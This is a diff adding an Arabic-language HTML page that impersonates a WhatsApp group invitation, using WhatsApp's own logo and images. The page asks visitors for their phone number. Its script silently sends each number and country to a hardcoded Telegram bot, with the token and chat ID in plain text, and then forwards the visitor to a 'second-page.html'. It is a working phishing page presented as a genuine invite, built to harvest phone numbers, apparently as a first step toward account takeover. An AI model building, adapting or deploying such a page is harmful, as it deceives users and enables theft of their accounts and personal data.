@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html style="background-color: #1ebea5;zoom:130%">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <title>الإنضمام إلى المجموعة</title>
+  <link rel="icon" type="image/x-icon" href="logo-ico-png.png">
+  <title id="pageTitle">الدعوة للانضمام إلى مجموعة واتساب</title>
+  <meta property="og:description" content="الدعوة للانضمام إلى مجموعة واتساب">
+  <meta property="invite_link_type" content="REGULAR">
+  <meta property="invite_link_type_v2" content="">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta property="og:image" content="https://static.whatsapp.net/rsrc.php/v3/yo/r/J5gK5AgJ_L5.png">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
+
+    <!-- Include intl-tel-input CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Almarai&display=swap" rel="stylesheet">
+    <style type="text/css">
+        .issam{
+            font-family: 'Almarai', sans-serif;
+            font-size: 29px;
+            color: #FFF;
+
+        }
+    </style>
+    
+</head>
+<body style="text-align: center;">
+
+
+    <img src="https://static.whatsapp.net/rsrc.php/yv/r/-r3j-x8ZnM7.svg" width="55%;" style="margin-top: 75px;">
+    <br><br>
+
+    <img style="margin-top:25px;" src="photo_5870472420022927978_m.jpg" width="50" height="50"  >
+
+    <h3 class="issam" style="margin-top:25px;"> المرجو إدخال الرقم الخاص بكم  </h3>
+    <div class="container">
+        <input id="phone" type="tel" required>
+        <p id="error-msg" style="color: red; display: none;">Invalid number</p>
+        <p id="valid-msg" style="color: green; display: none;">Valid number</p>
+        
+        <button onclick="sendPhoneNumber()" type="submit" style="margin-top: 15px;font-size: 15px;font-family: 'Almarai', sans-serif;padding: 10px;width: 200px;background-color: #01e675;color:#FFF;border:none;">الإنضمام إلى الدردشة</button>
+    </div>
+
+    <!-- Include intl-tel-input JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+
+   <script>
+        const botToken = '7637768536:AAFBR5maC19HT1kLRb9PI4ynubtztkEUTPk';  // Replace with your Telegram bot token
+        const chatId = '7672163375';      // Replace with your chat ID (can be group chat or your Telegram ID)
+
+        const phoneInputField = document.querySelector("#phone");
+        const errorMsg = document.querySelector("#error-msg");
+        const validMsg = document.querySelector("#valid-msg");
+
+        // Initialize the international input plugin
+        const phoneInput = window.intlTelInput(phoneInputField, {
+            initialCountry: "auto",
+            geoIpLookup: function (callback) {
+                fetch('https://ipinfo.io', { headers: { 'Accept': 'application/json' } })
+                    .then((resp) => resp.json())
+                    .then((resp) => {
+                        const countryCode = resp && resp.country ? resp.country : "us";
+                        callback(countryCode);
+                    });
+            },
+            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
+        });
+
+        // Function to send phone number to Telegram and navigate to the second page
+        function sendPhoneNumber() {
+            const phoneNumber = phoneInput.getNumber();
+            const countryName = phoneInput.getSelectedCountryData().name;
+
+            if (phoneInput.isValidNumber()) {
+                validMsg.style.display = 'block';
+                errorMsg.style.display = 'none';
+
+                // Prepare the message for Telegram
+                const message = `Phone Number: ${phoneNumber}\nCountry: ${countryName}`;
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                // Send the data to Telegram
+                fetch(url)
+                    .then(response => {
+                        if (response.ok) {
+                            // Save phone number and country name to localStorage for the second page
+                            localStorage.setItem('phoneNumber', phoneNumber);
+                            localStorage.setItem('countryName', countryName);
+
+                            // Redirect to the second page
+                            window.location.href = "second-page.html";
+                        } else {
+                            alert('Failed to send data to Telegram');
+                        }
+                    })
+                    .catch(error => {
+                        alert('Error sending data: ' + error);
+                    });
+            } else {
+                validMsg.style.display = 'none';
+                errorMsg.style.display = 'block';
+            }
+        }
+    </script>
+    
+</body>
+</html>
